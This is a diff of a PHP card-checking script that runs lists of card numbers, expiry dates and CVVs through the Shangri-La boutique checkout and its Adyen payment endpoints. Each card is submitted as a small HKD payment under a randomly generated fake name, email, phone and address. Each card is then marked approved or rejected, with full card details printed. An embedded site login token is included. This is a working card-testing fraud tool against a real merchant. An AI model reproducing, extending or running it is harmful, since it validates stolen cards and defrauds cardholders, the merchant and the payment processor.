@@ -1,81 +1,120 @@
 <?php
-ignore_user_abort(true);
+ignore_user_abort();
 error_reporting(0);
+session_start();
+
+// HEADERS JSON PARA EL INDEX.HTML
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: GET, POST');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
 
-// Función para manejar errores y enviar respuesta JSON
-function sendResponse($status, $message, $data = []) {
-    http_response_code($status == 'error' ? 500 : 200);
+// Manejar preflight requests
+if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
+    http_response_code(200);
+    exit();
+}
+
+function multiexplode($delimiters, $string) {
+    $one = str_replace($delimiters, $delimiters[0], $string);
+    $two = explode($delimiters[0], $one);
+    return $two;
+}
+
+// Verificar si se recibió la lista
+if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
     echo json_encode([
-        'success' => $status == 'success',
-        'status' => $status,
-        'message' => $message,
-        'data' => $data,
-        'timestamp' => date('Y-m-d H:i:s')
+        'status' => 'error',
+        'message' => 'No se recibió lista de tarjetas',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">No se recibió lista...</span>'
     ]);
     exit();
 }
 
-// Verificar si se recibió la lista
-if (!isset($_GET['lista']) || empty($_GET['lista'])) {
-    sendResponse('error', 'No se proporcionó la lista de tarjetas');
-}
-
-$lista = $_GET['lista'];
-$parts = explode("|", $lista);
+$lista = trim($_GET['lista']);
+$delemitador = array("|", ";", ":", "/", "»", "«", ">", "<");
 
 // Validar formato
-if (count($parts) < 4) {
-    sendResponse('error', 'Formato incorrecto. Use: NUMERO|MES|AÑO|CVV');
+$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
+if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex)) {
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Formato de lista inválido',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span>'
+    ]);
+    exit();
 }
 
-$cc = trim($parts[0]);
-$mes = trim($parts[1]);
-$ano = trim($parts[2]);
-$cvv = trim($parts[3]);
+$cc = multiexplode($delemitador, $lista)[0];
+$mes = multiexplode($delemitador, $lista)[1];
+$ano = multiexplode($delemitador, $lista)[2];
+$cvv = multiexplode($delemitador, $lista)[3];
 
-// Validar datos básicos
-if (!preg_match('/^\d{13,19}$/', $cc)) {
-    sendResponse('error', 'Número de tarjeta inválido');
-}
-
-if (!preg_match('/^(0?[1-9]|1[0-2])$/', $mes)) {
-    sendResponse('error', 'Mes inválido');
-}
-
-if (!preg_match('/^\d{2,4}$/', $ano)) {
-    sendResponse('error', 'Año inválido');
-}
-
-if (!preg_match('/^\d{3,4}$/', $cvv)) {
-    sendResponse('error', 'CVV inválido');
-}
-
-// Formatear mes y año
+// Formatear fecha
 if (strlen($mes) == 1) $mes = "0$mes";
 if (strlen($ano) == 2) $ano = "20$ano";
 
-// Configuración básica
+// Determinar tipo de tarjeta
+$re = array(
+    "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
+    "Master" => "/^5[1-5]\d{14}$/",
+    "Amex" => "/^3[47]\d{13,14}$/",
+    "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(6550)|(6516)|(6504)||(6509)|(4011))\d{0,12})$/",
+    "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
+);
+
+if (preg_match($re['Visa'], $cc)) {
+    $tipo = "Visa";
+} else if (preg_match($re['Amex'], $cc)) {
+    $tipo = "Amex";
+} else if (preg_match($re['Master'], $cc)) {
+    $tipo = "Master";
+} else if (preg_match($re['Elo'], $cc)) {
+    $tipo = "Elo";
+} else if (preg_match($re['hipercard'], $cc)) {
+    $tipo = "Hipercard";
+} else {
+    echo json_encode([
+        'status' => 'rejected',
+        'message' => 'Cartão não suportado',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">Cartão não suportado</span>'
+    ]);
+    exit();
+}
+
+// CONFIGURACIÓN SHANGRI-LA
+$client_id = "14";
+$promotion_id = "1";
 $api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
+$api_locale = "en";
+$adyen_version = "_0_1_25";
+$adyen_key = "10001|EA9DDE733BC69B0DF0AA6AAB6CAC1A8EE7D2D5BA830C670D2EABF9133B098A88BE1F8ABBDD999BA3A5B36465941FE09D95A4A9A1A53C815583DA1932C926B5C8F4023A183CEF755DE196D2FA9474F97DB47B4647A45D35AB9198EC492006C999680E0592005F1C1400B041ECE0282FF58BCD66DFA4B98CC262E0A450DD623FB57A4F2C05A624958F02F4D764FAE903362EC07457A970F9F64512AA8DC6008CEC94C1A675F6432BC1070BCB311462FB52EC23B3FE568A7D7B154506C91544671A43729520C448698CF590A6682F2BB4BDC95B9267361266A57EC68EC0830AD6ECDCC3447C049578787601685B98926471BE6F5BF1E8A1E97FD13009844A0B82E7";
+$return_url = "https://boutique.shangri-la.com/adyen_card_redirect.php";
+$hotel_code = "ISL";
 $site_login_token = "beQDmTL1oVRPZmOLWQdnFXCtRC4Eu5M81h3KtAiWIM0VMTki7RXw9RPrFlXLhoP42a5YNETYAcPVdmv8";
 
-// Función para hacer peticiones CURL con manejo de errores
-function makeCurlRequest($url, $data) {
+// Función para hacer peticiones CURL
+function makeRequest($url, $data, $headers = []) {
     $ch = curl_init();
+    
+    $defaultHeaders = [
+        "Accept: application/json",
+        "Content-Type: application/json",
+        "Referer: https://boutique.shangri-la.com/food_checkout.php",
+        "Origin: https://boutique.shangri-la.com",
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    ];
+    
+    if (!empty($headers)) {
+        $defaultHeaders = array_merge($defaultHeaders, $headers);
+    }
     
     curl_setopt_array($ch, [
         CURLOPT_URL => $url,
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_SSL_VERIFYPEER => false,
         CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        CURLOPT_HTTPHEADER => [
-            'Content-Type: application/json',
-            'Accept: application/json'
-        ],
+        CURLOPT_HTTPHEADER => $defaultHeaders,
         CURLOPT_POST => true,
         CURLOPT_POSTFIELDS => json_encode($data),
         CURLOPT_TIMEOUT => 30,
@@ -89,154 +128,254 @@ function makeCurlRequest($url, $data) {
     $error = curl_error($ch);
     curl_close($ch);
     
-    if ($response === false) {
-        return [
-            'success' => false,
-            'error' => "CURL Error: $error",
-            'http_code' => $http_code
-        ];
-    }
-    
-    $decoded = json_decode($response, true);
-    
-    if (json_last_error() !== JSON_ERROR_NONE) {
-        return [
-            'success' => false,
-            'error' => 'Invalid JSON response',
-            'raw_response' => substr($response, 0, 200)
-        ];
-    }
-    
     return [
-        'success' => true,
-        'data' => $decoded,
+        'response' => $response,
         'http_code' => $http_code,
-        'raw_response' => $response
+        'error' => $error,
+        'success' => $http_code == 200 && empty($error)
     ];
 }
 
-// 1. Crear orden
+// PASO 1: CREAR ORDEN
 $init_data = [
-    "client_id" => "14",
-    "promotion_id" => "1",
-    "lang" => "en",
+    "client_id" => $client_id,
+    "promotion_id" => $promotion_id,
+    "lang" => $api_locale,
     "site_login_token" => $site_login_token,
-    "hotel_code" => "ISL",
-    "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
+    "hotel_code" => $hotel_code,
+    "return_url" => $return_url,
     "order_amount" => 100,
     "payment_method" => "adyen"
 ];
 
-$init_result = makeCurlRequest($api_endpoint . "/checkout_init.php", $init_data);
+$init_result = makeRequest($api_endpoint . "/checkout_init.php", $init_data);
 
 if (!$init_result['success']) {
-    sendResponse('error', 'Error al crear orden: ' . $init_result['error'], [
-        'step' => 'checkout_init',
-        'card' => substr($cc, -4)
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Error al crear orden',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">HTTP ' . $init_result['http_code'] . ' - ' . $init_result['error'] . '</span>'
     ]);
+    exit();
 }
 
-if (!isset($init_result['data']['order_number']) || !isset($init_result['data']['order_token'])) {
-    sendResponse('rejected', 'No se pudo crear orden', [
-        'step' => 'checkout_init',
-        'response' => $init_result['data'],
-        'card' => substr($cc, -4)
+$init_data = json_decode($init_result['response'], true);
+
+if (!$init_data || !isset($init_data['order_number'])) {
+    echo json_encode([
+        'status' => 'rejected',
+        'message' => 'Error en creación de orden',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">No se pudo crear orden</span>'
     ]);
+    exit();
 }
 
-$order_number = $init_result['data']['order_number'];
-$order_token = $init_result['data']['order_token'];
+$order_number = $init_data['order_number'];
+$order_token = $init_data['order_token'];
+$order_amount = isset($init_data['order_amount']) ? $init_data['order_amount'] : 100;
 
-// 2. Encriptar datos de tarjeta
+// Para mes en formato simple (1-12)
+$mes2 = (int)$mes;
+
+// PASO 2: ENCRIPTAR TARJETA
 $encrypt_data = [
-    "client_id" => "14",
-    "promotion_id" => "1",
-    "lang" => "en",
+    "client_id" => $client_id,
+    "promotion_id" => $promotion_id,
+    "lang" => $api_locale,
     "site_login_token" => $site_login_token,
     "order_number" => $order_number,
     "order_token" => $order_token,
     "card" => $cc,
-    "month" => $mes,
+    "month" => $mes2,
     "year" => $ano,
     "cvv" => $cvv,
-    "adyen_key" => "10001|EA9DDE733BC69B0DF0AA6AAB6CAC1A8EE7D2D5BA830C670D2EABF9133B098A88BE1F8ABBDD999BA3A5B36465941FE09D95A4A9A1A53C815583DA1932C926B5C8F4023A183CEF755DE196D2FA9474F97DB47B4647A45D35AB9198EC492006C999680E0592005F1C1400B041ECE0282FF58BCD66DFA4B98CC262E0A450DD623FB57A4F2C05A624958F02F4D764FAE903362EC07457A970F9F64512AA8DC6008CEC94C1A675F6432BC1070BCB311462FB52EC23B3FE568A7D7B154506C91544671A43729520C448698CF590A6682F2BB4BDC95B9267361266A57EC68EC0830AD6ECDCC3447C049578787601685B98926471BE6F5BF1E8A1E97FD13009844A0B82E7",
-    "adyen_version" => "_0_1_25"
+    "adyen_key" => $adyen_key,
+    "adyen_version" => $adyen_version
 ];
 
-$encrypt_result = makeCurlRequest($api_endpoint . "/adyen_encrypt.php", $encrypt_data);
+$encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $encrypt_data);
 
 if (!$encrypt_result['success']) {
-    sendResponse('error', 'Error al encriptar datos: ' . $encrypt_result['error'], [
-        'step' => 'adyen_encrypt',
-        'card' => substr($cc, -4)
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Error al encriptar tarjeta',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">HTTP ' . $encrypt_result['http_code'] . ' - ' . $encrypt_result['error'] . '</span>'
     ]);
+    exit();
 }
 
-if (!isset($encrypt_result['data']['encryptedCardNumber'])) {
-    sendResponse('rejected', 'Error en encriptación de tarjeta', [
-        'step' => 'adyen_encrypt',
-        'response' => $encrypt_result['data'],
-        'card' => substr($cc, -4)
+$encrypted_data = json_decode($encrypt_result['response'], true);
+
+if (!$encrypted_data || !isset($encrypted_data['encryptedCardNumber'])) {
+    echo json_encode([
+        'status' => 'rejected',
+        'message' => 'Error en encriptación',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">Error en encriptación</span>'
     ]);
+    exit();
 }
 
-$encryptedCardNumber = $encrypt_result['data']['encryptedCardNumber'];
-$encryptedExpiryMonth = $encrypt_result['data']['encryptedExpiryMonth'];
-$encryptedExpiryYear = $encrypt_result['data']['encryptedExpiryYear'];
-$encryptedSecurityCode = $encrypt_result['data']['encryptedSecurityCode'];
+$encryptedCardNumber = $encrypted_data['encryptedCardNumber'];
+$encryptedExpiryMonth = $encrypted_data['encryptedExpiryMonth'];
+$encryptedExpiryYear = $encrypted_data['encryptedExpiryYear'];
+$encryptedSecurityCode = $encrypted_data['encryptedSecurityCode'];
 
-// 3. Procesar pago
+// Datos para el pago (nombre aleatorio)
+$nomes = array('Christo','Ryan','Ethan','John','Zoey','Sarah','Pedro','Lucas','Alex','Ana');
+$sobrenomes = array('Walker','Thompson','Anderson','Johnson','Trembay','Peltier','Soares','Souza','Esquilo','Bila');
+$name = $nomes[mt_rand(0, count($nomes) - 1)];
+$sobre = $sobrenomes[mt_rand(0, count($sobrenomes) - 1)];
+
+// PASO 3: PROCESAR PAGO
 $process_data = [
-    "client_id" => "14",
-    "promotion_id" => "1",
-    "lang" => "en",
+    "client_id" => $client_id,
+    "promotion_id" => $promotion_id,
+    "lang" => $api_locale,
     "site_login_token" => $site_login_token,
     "order_number" => $order_number,
     "order_token" => $order_token,
-    "hotel_code" => "ISL",
+    "hotel_code" => $hotel_code,
     "encryptedCardNumber" => $encryptedCardNumber,
     "encryptedExpiryMonth" => $encryptedExpiryMonth,
     "encryptedExpiryYear" => $encryptedExpiryYear,
     "encryptedSecurityCode" => $encryptedSecurityCode,
-    "amount" => ["value" => 100, "currency" => "HKD"],
-    "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
+    "amount" => [
+        "value" => $order_amount,
+        "currency" => "HKD"
+    ],
+    "return_url" => $return_url,
     "payment_method" => "adyen",
-    "card_type" => "Visa"
+    "card_type" => $tipo,
+    "billing_address" => [
+        "firstName" => $name,
+        "lastName" => $sobre,
+        "email" => strtolower($name) . "." . strtolower($sobre) . "@gmail.com",
+        "phone" => "+852" . mt_rand(50000000, 99999999),
+        "address" => [
+            "street" => "Flat 12B, Tower 1",
+            "houseNumberOrName" => "The Arch",
+            "city" => "Hong Kong",
+            "postalCode" => "000000",
+            "country" => "HK"
+        ]
+    ]
 ];
 
-$process_result = makeCurlRequest($api_endpoint . "/adyen_process.php", $process_data);
+$process_result = makeRequest($api_endpoint . "/adyen_process.php", $process_data);
 
 if (!$process_result['success']) {
-    sendResponse('error', 'Error al procesar pago: ' . $process_result['error'], [
-        'step' => 'adyen_process',
-        'card' => substr($cc, -4)
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Error al procesar pago',
+        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">HTTP ' . $process_result['http_code'] . ' - ' . $process_result['error'] . '</span>'
     ]);
+    exit();
 }
 
-// Verificar resultado
-if (isset($process_result['data']['resultCode']) && $process_result['data']['resultCode'] == 'Authorised') {
-    sendResponse('success', 'Tarjeta APROBADA', [
-        'card' => substr($cc, -4),
-        'bin' => substr($cc, 0, 6),
-        'expiry' => $mes . '/' . substr($ano, -2),
-        'result' => 'Authorised',
-        'gateway' => 'Adyen',
-        'amount' => '100 HKD',
-        'order_number' => $order_number,
-        'full_response' => $process_result['data']
+$process_data = json_decode($process_result['response'], true);
+
+// DETERMINAR RESULTADO
+if (isset($process_data['resultCode'])) {
+    switch($process_data['resultCode']) {
+        case 'Authorised':
+            echo json_encode([
+                'status' => 'approved',
+                'message' => 'Pago autorizado',
+                'html' => '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
+                         '<span class="badge badge-success">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
+                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                         '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span>',
+                'data' => [
+                    'card_last4' => substr($cc, -4),
+                    'bin' => substr($cc, 0, 6),
+                    'expiry' => $mes . '/' . substr($ano, -2),
+                    'result' => 'Authorised',
+                    'order_number' => $order_number,
+                    'auth_code' => isset($process_data['authCode']) ? $process_data['authCode'] : null,
+                    'psp_reference' => isset($process_data['pspReference']) ? $process_data['pspReference'] : null,
+                    'amount' => number_format($order_amount/100, 2) . ' HKD'
+                ]
+            ]);
+            break;
+            
+        case 'Refused':
+            $reason = isset($process_data['refusalReason']) ? $process_data['refusalReason'] : 'Rechazado';
+            echo json_encode([
+                'status' => 'rejected',
+                'message' => $reason,
+                'html' => '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
+                         '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
+                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                         '<span class="badge badge-warning">' . $reason . '</span>',
+                'data' => [
+                    'card_last4' => substr($cc, -4),
+                    'reason' => $reason,
+                    'order_number' => $order_number
+                ]
+            ]);
+            break;
+            
+        case 'Error':
+        case 'Cancelled':
+            $reason = isset($process_data['refusalReason']) ? $process_data['refusalReason'] : $process_data['resultCode'];
+            echo json_encode([
+                'status' => 'error',
+                'message' => $reason,
+                'html' => '<span class="badge badge-warning">⚠️ ERROR</span> ➔ ' .
+                         '<span class="badge badge-warning">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
+                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                         '<span class="badge badge-warning">' . $reason . '</span>',
+                'data' => [
+                    'card_last4' => substr($cc, -4),
+                    'reason' => $reason,
+                    'order_number' => $order_number
+                ]
+            ]);
+            break;
+            
+        default:
+            echo json_encode([
+                'status' => 'unknown',
+                'message' => 'Respuesta desconocida: ' . $process_data['resultCode'],
+                'html' => '<span class="badge badge-warning">⚠️ REVISAR</span> ➔ ' .
+                         '<span class="badge badge-warning">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
+                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                         '<span class="badge badge-warning">' . $process_data['resultCode'] . '</span>',
+                'data' => [
+                    'card_last4' => substr($cc, -4),
+                    'result_code' => $process_data['resultCode'],
+                    'full_response' => $process_data
+                ]
+            ]);
+    }
+} elseif (isset($process_data['action'])) {
+    // 3D Secure requerido
+    echo json_encode([
+        'status' => '3d_secure',
+        'message' => '3D Secure requerido',
+        'html' => '<span class="badge badge-info">🔄 3D SECURE</span> ➔ ' .
+                 '<span class="badge badge-success">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
+                 '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                 '<span class="badge badge-warning">3D Secure requerido</span>',
+        'data' => [
+            'card_last4' => substr($cc, -4),
+            'action_url' => isset($process_data['action']['url']) ? $process_data['action']['url'] : null,
+            'action_method' => isset($process_data['action']['method']) ? $process_data['action']['method'] : null,
+            'order_number' => $order_number
+        ]
     ]);
 } else {
-    $reason = isset($process_result['data']['refusalReason']) 
-        ? $process_result['data']['refusalReason'] 
-        : (isset($process_result['data']['resultCode']) 
-            ? $process_result['data']['resultCode'] 
-            : 'Desconocido');
-    
-    sendResponse('rejected', 'Tarjeta RECHAZADA: ' . $reason, [
-        'card' => substr($cc, -4),
-        'reason' => $reason,
-        'gateway' => 'Adyen',
-        'response' => $process_result['data']
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Respuesta inesperada de la API',
+        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
+                 '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
+                 '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                 '<span class="badge badge-warning">Respuesta inesperada</span>',
+        'data' => [
+            'card_last4' => substr($cc, -4),
+            'raw_response' => $process_data
+        ]
     ]);
 }
 ?>
